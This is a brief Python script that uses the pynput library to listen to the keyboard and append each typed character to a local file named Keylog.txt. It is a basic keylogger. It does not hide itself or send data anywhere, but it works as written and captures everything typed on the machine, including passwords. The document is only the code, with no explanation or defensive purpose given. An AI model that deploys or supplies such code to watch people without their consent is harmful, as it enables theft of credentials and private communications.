from pynput import keyboard

def Key_is_pressed(key):
    with open("Keylog.txt", "a") as logKey:
        try:
            xar = key.char
            logKey.write(xar)
        except:
            print("Error writing")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Key_is_pressed)
    listener.start()
    input()